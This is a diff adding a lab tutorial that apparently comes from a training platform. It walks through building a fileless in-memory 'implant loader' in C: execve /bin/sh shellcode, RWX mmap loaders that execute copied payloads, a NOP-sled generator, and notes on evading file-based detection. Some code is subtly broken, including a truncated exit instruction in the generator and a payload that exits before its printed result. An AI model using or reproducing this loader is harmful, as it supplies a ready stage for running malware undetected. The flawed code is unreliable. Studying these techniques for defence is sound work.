@@ -1,0 +1,455 @@
+Implement In-Memory Implant Loader
+Learning Objectives
+By completing this lab, you will:
+
+Understand in-memory code execution techniques
+Develop a loader that executes shellcode without disk writes
+Implement memory allocation and execution protection mechanisms
+Test and verify in-memory implant execution
+Prerequisites
+Basic knowledge of C programming
+Understanding of Linux memory management
+Familiarity with assembly language concepts
+Command-line proficiency in Linux
+Lab Environment
+Al Nafi provides Linux-based cloud machines for this lab. Simply click Start Lab to access your dedicated environment. The provided Linux machine is bare metal with no pre-installed tools, so you will install required tools during the lab.
+
+Task 1: Set Up Development Environment
+Subtask 1.1: Install Required Tools
+# Update package manager
+sudo apt update
+
+# Install development tools
+sudo apt install -y gcc make gdb hexdump
+
+# Install additional utilities
+sudo apt install -y vim nano
+Subtask 1.2: Create Working Directory
+# Create lab directory
+mkdir ~/implant_loader_lab
+cd ~/implant_loader_lab
+
+# Create subdirectories
+mkdir src bin test
+Task 2: Write In-Memory Loader Code
+Subtask 2.1: Create Basic Shellcode
+Create a simple test shellcode that prints a message:
+
+vim src/test_shellcode.c
+#include <stdio.h>
+#include <unistd.h>
+
+// Simple shellcode that executes /bin/sh
+// This is for educational purposes only
+unsigned char shellcode[] = 
+    "\x48\x31\xd2"                // xor rdx, rdx
+    "\x48\x31\xf6"                // xor rsi, rsi
+    "\x48\xbb\x2f\x62\x69\x6e"    // mov rbx, '/bin'
+    "\x2f\x73\x68\x00"            // '/sh\0'
+    "\x53"                        // push rbx
+    "\x48\x89\xe7"                // mov rdi, rsp
+    "\x48\x31\xc0"                // xor rax, rax
+    "\xb0\x3b"                    // mov al, 59 (sys_execve)
+    "\x0f\x05";                   // syscall
+
+int main() {
+    printf("Shellcode length: %lu bytes\n", sizeof(shellcode) - 1);
+    return 0;
+}
+Subtask 2.2: Create In-Memory Loader
+vim src/memory_loader.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <unistd.h>
+
+// Test shellcode - prints message and exits
+unsigned char test_payload[] = 
+    "\x48\x31\xc0"                // xor rax, rax
+    "\x48\x31\xff"                // xor rdi, rdi
+    "\x48\x31\xf6"                // xor rsi, rsi
+    "\x48\x31\xd2"                // xor rdx, rdx
+    "\x48\xc7\xc0\x01\x00\x00\x00" // mov rax, 1 (sys_write)
+    "\x48\xc7\xc7\x01\x00\x00\x00" // mov rdi, 1 (stdout)
+    "\x48\x8d\x35\x0a\x00\x00\x00" // lea rsi, [rip+10]
+    "\x48\xc7\xc2\x0d\x00\x00\x00" // mov rdx, 13
+    "\x0f\x05"                    // syscall
+    "\x48\x31\xc0"                // xor rax, rax
+    "\x48\xc7\xc0\x3c\x00\x00\x00" // mov rax, 60 (sys_exit)
+    "\x48\x31\xff"                // xor rdi, rdi
+    "\x0f\x05"                    // syscall
+    "Hello World!\n";
+
+typedef void (*shellcode_func)();
+
+void* allocate_executable_memory(size_t size) {
+    void* mem = mmap(NULL, size, 
+                     PROT_READ | PROT_WRITE | PROT_EXEC,
+                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    
+    if (mem == MAP_FAILED) {
+        perror("mmap failed");
+        return NULL;
+    }
+    
+    printf("[+] Allocated executable memory at: %p\n", mem);
+    return mem;
+}
+
+int load_and_execute_shellcode(unsigned char* payload, size_t payload_size) {
+    printf("[+] Loading shellcode of size: %zu bytes\n", payload_size);
+    
+    // Allocate executable memory
+    void* exec_mem = allocate_executable_memory(payload_size);
+    if (!exec_mem) {
+        return -1;
+    }
+    
+    // Copy shellcode to executable memory
+    memcpy(exec_mem, payload, payload_size);
+    printf("[+] Shellcode copied to memory\n");
+    
+    // Cast memory to function pointer
+    shellcode_func execute = (shellcode_func)exec_mem;
+    
+    printf("[+] Executing shellcode...\n");
+    
+    // Execute the shellcode
+    execute();
+    
+    // Clean up (this may not be reached if shellcode exits)
+    munmap(exec_mem, payload_size);
+    printf("[+] Memory cleaned up\n");
+    
+    return 0;
+}
+
+int main(int argc, char* argv[]) {
+    printf("=== In-Memory Implant Loader ===\n");
+    printf("[+] Starting loader...\n");
+    
+    size_t payload_size = sizeof(test_payload) - 1; // Exclude null terminator
+    
+    if (load_and_execute_shellcode(test_payload, payload_size) != 0) {
+        fprintf(stderr, "[-] Failed to load and execute shellcode\n");
+        return 1;
+    }
+    
+    return 0;
+}
+Subtask 2.3: Create Advanced Loader with Error Handling
+vim src/advanced_loader.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <errno.h>
+
+// Simple calculator shellcode (adds two numbers)
+unsigned char calc_payload[] = 
+    "\x48\x31\xc0"                // xor rax, rax
+    "\x48\xc7\xc0\x05\x00\x00\x00" // mov rax, 5
+    "\x48\xc7\xc3\x03\x00\x00\x00" // mov rbx, 3
+    "\x48\x01\xd8"                // add rax, rbx
+    "\x48\x89\xc7"                // mov rdi, rax (result = 8)
+    "\x48\xc7\xc0\x3c\x00\x00\x00" // mov rax, 60 (sys_exit)
+    "\x0f\x05";                   // syscall
+
+typedef int (*payload_func)();
+
+struct loader_context {
+    void* memory;
+    size_t size;
+    int is_allocated;
+};
+
+int initialize_loader_context(struct loader_context* ctx, size_t size) {
+    ctx->size = size;
+    ctx->is_allocated = 0;
+    
+    // Allocate memory with RWX permissions
+    ctx->memory = mmap(NULL, size,
+                       PROT_READ | PROT_WRITE | PROT_EXEC,
+                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    
+    if (ctx->memory == MAP_FAILED) {
+        fprintf(stderr, "[-] Memory allocation failed: %s\n", strerror(errno));
+        return -1;
+    }
+    
+    ctx->is_allocated = 1;
+    printf("[+] Allocated %zu bytes at %p\n", size, ctx->memory);
+    return 0;
+}
+
+void cleanup_loader_context(struct loader_context* ctx) {
+    if (ctx->is_allocated && ctx->memory) {
+        munmap(ctx->memory, ctx->size);
+        printf("[+] Memory freed\n");
+        ctx->is_allocated = 0;
+        ctx->memory = NULL;
+    }
+}
+
+int load_payload(struct loader_context* ctx, unsigned char* payload, size_t payload_size) {
+    if (!ctx->is_allocated) {
+        fprintf(stderr, "[-] Context not initialized\n");
+        return -1;
+    }
+    
+    if (payload_size > ctx->size) {
+        fprintf(stderr, "[-] Payload too large for allocated memory\n");
+        return -1;
+    }
+    
+    // Copy payload to executable memory
+    memcpy(ctx->memory, payload, payload_size);
+    printf("[+] Payload loaded (%zu bytes)\n", payload_size);
+    
+    return 0;
+}
+
+int execute_payload(struct loader_context* ctx) {
+    if (!ctx->is_allocated) {
+        fprintf(stderr, "[-] Context not initialized\n");
+        return -1;
+    }
+    
+    printf("[+] Executing payload...\n");
+    
+    // Cast to function pointer and execute
+    payload_func func = (payload_func)ctx->memory;
+    int result = func();
+    
+    printf("[+] Payload executed, result: %d\n", result);
+    return result;
+}
+
+int main() {
+    printf("=== Advanced In-Memory Loader ===\n");
+    
+    struct loader_context ctx;
+    size_t payload_size = sizeof(calc_payload) - 1;
+    
+    // Initialize loader context
+    if (initialize_loader_context(&ctx, 4096) != 0) {
+        return 1;
+    }
+    
+    // Load payload
+    if (load_payload(&ctx, calc_payload, payload_size) != 0) {
+        cleanup_loader_context(&ctx);
+        return 1;
+    }
+    
+    // Execute payload
+    execute_payload(&ctx);
+    
+    // Cleanup
+    cleanup_loader_context(&ctx);
+    
+    printf("[+] Loader completed successfully\n");
+    return 0;
+}
+Task 3: Compile and Test In-Memory Execution
+Subtask 3.1: Compile the Loaders
+# Compile basic loader
+gcc -o bin/memory_loader src/memory_loader.c -z execstack
+
+# Compile advanced loader
+gcc -o bin/advanced_loader src/advanced_loader.c -z execstack
+
+# Compile test shellcode
+gcc -o bin/test_shellcode src/test_shellcode.c
+Subtask 3.2: Test Basic Loader
+# Run the basic loader
+echo "[+] Testing basic in-memory loader..."
+./bin/memory_loader
+echo "Exit code: $?"
+Subtask 3.3: Test Advanced Loader
+# Run the advanced loader
+echo "[+] Testing advanced in-memory loader..."
+./bin/advanced_loader
+echo "Exit code: $?"
+Subtask 3.4: Create Memory Analysis Script
+vim test/analyze_memory.sh
+#!/bin/bash
+
+echo "=== Memory Analysis Script ==="
+
+# Function to analyze process memory
+analyze_process() {
+    local pid=$1
+    echo "[+] Analyzing process $pid"
+    
+    if [ -d "/proc/$pid" ]; then
+        echo "Memory maps:"
+        cat /proc/$pid/maps | grep -E "(rwx|r-x)"
+        echo ""
+        echo "Memory status:"
+        cat /proc/$pid/status | grep -E "(VmSize|VmRSS|VmExe)"
+    else
+        echo "[-] Process $pid not found"
+    fi
+}
+
+# Run loader in background and analyze
+echo "[+] Starting loader analysis..."
+./bin/advanced_loader &
+LOADER_PID=$!
+
+sleep 1
+analyze_process $LOADER_PID
+
+wait $LOADER_PID
+echo "[+] Analysis complete"
+chmod +x test/analyze_memory.sh
+./test/analyze_memory.sh
+Task 4: Create Payload Injection Test
+Subtask 4.1: Create Payload Generator
+vim src/payload_generator.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void generate_nop_sled(unsigned char* buffer, size_t size) {
+    for (size_t i = 0; i < size; i++) {
+        buffer[i] = 0x90; // NOP instruction
+    }
+}
+
+void print_payload_hex(unsigned char* payload, size_t size) {
+    printf("Payload hex dump:\n");
+    for (size_t i = 0; i < size; i++) {
+        printf("\\x%02x", payload[i]);
+        if ((i + 1) % 16 == 0) printf("\n");
+    }
+    printf("\n");
+}
+
+int main() {
+    printf("=== Payload Generator ===\n");
+    
+    // Generate a simple payload
+    unsigned char payload[64];
+    generate_nop_sled(payload, 60);
+    
+    // Add exit syscall at the end
+    payload[60] = 0x48; // mov rax, 60
+    payload[61] = 0xc7;
+    payload[62] = 0xc0;
+    payload[63] = 0x3c;
+    
+    print_payload_hex(payload, 64);
+    
+    return 0;
+}
+Subtask 4.2: Compile and Test Payload Generator
+gcc -o bin/payload_generator src/payload_generator.c
+./bin/payload_generator
+Subtask 4.3: Create Verification Script
+vim test/verify_execution.sh
+#!/bin/bash
+
+echo "=== Execution Verification Script ==="
+
+# Test 1: Basic loader functionality
+echo "[+] Test 1: Basic loader"
+timeout 5s ./bin/memory_loader
+RESULT1=$?
+echo "Basic loader exit code: $RESULT1"
+
+# Test 2: Advanced loader functionality  
+echo "[+] Test 2: Advanced loader"
+timeout 5s ./bin/advanced_loader
+RESULT2=$?
+echo "Advanced loader exit code: $RESULT2"
+
+# Test 3: Memory allocation verification
+echo "[+] Test 3: Memory verification"
+strace -e mmap,munmap ./bin/advanced_loader 2>&1 | grep -E "(mmap|munmap)"
+
+echo "[+] All tests completed"
+chmod +x test/verify_execution.sh
+./test/verify_execution.sh
+Task 5: Security Analysis and Documentation
+Subtask 5.1: Create Security Analysis
+vim test/security_analysis.md
+# Security Analysis: In-Memory Loader
+
+## Memory Protection Mechanisms
+- Uses mmap() with PROT_EXEC for executable memory allocation
+- Implements proper memory cleanup with munmap()
+- Avoids disk-based payload storage
+
+## Detection Evasion Techniques
+- No file system artifacts created
+- Direct memory execution without intermediate files
+- Dynamic memory allocation patterns
+
+## Potential Detection Points
+- Memory allocation with RWX permissions
+- Unusual memory mapping patterns
+- System call sequences (mmap, memcpy, execution)
+
+## Mitigation Recommendations
+- Monitor mmap() calls with executable permissions
+- Implement Control Flow Integrity (CFI)
+- Use Address Space Layout Randomization (ASLR)
+Subtask 5.2: Document Loader Architecture
+vim test/loader_documentation.md
+# In-Memory Loader Architecture
+
+## Components
+1. **Memory Allocator**: Manages executable memory regions
+2. **Payload Loader**: Copies shellcode to allocated memory
+3. **Execution Engine**: Transfers control to loaded payload
+4. **Context Manager**: Handles cleanup and error states
+
+## Execution Flow
+1. Initialize loader context
+2. Allocate executable memory (RWX)
+3. Copy payload to memory
+4. Cast memory address to function pointer
+5. Execute payload
+6. Clean up allocated memory
+
+## Key Functions
+- `allocate_executable_memory()`: Memory allocation
+- `load_payload()`: Payload copying
+- `execute_payload()`: Execution transfer
+- `cleanup_loader_context()`: Resource cleanup
+Verification and Testing
+Final Verification Commands
+# Verify all binaries are created
+ls -la bin/
+
+# Test memory allocation
+echo "[+] Testing memory operations..."
+strace -e mmap ./bin/advanced_loader 2>&1 | head -10
+
+# Check for memory leaks
+echo "[+] Checking for memory leaks..."
+valgrind --leak-check=full ./bin/advanced_loader
+
+# Verify no disk writes during execution
+echo "[+] Monitoring file operations..."
+strace -e write,open,openat ./bin/memory_loader 2>&1 | grep -v "write(1"
+Conclusion
+You have successfully implemented an in-memory implant loader that:
+
+Allocates executable memory using system calls without disk interaction
+Loads and executes shellcode entirely in memory
+Implements proper error handling and resource management
+Demonstrates advanced memory manipulation techniques
+This lab provided hands-on experience with memory management, shellcode execution, and evasion techniques commonly used in advanced cybersecurity scenarios. The in-memory execution approach avoids traditional file-based detection methods, making it a valuable technique for understanding both offensive and defensive security concepts.
+
+Key Skills Developed:
+
+Memory allocation and protection mechanisms
+Shellcode loading and execution
+System-level programming in C
+Security analysis and documentation
+These techniques are essential for cybersecurity professionals working in penetration testing, malware analysis, and security research domains.
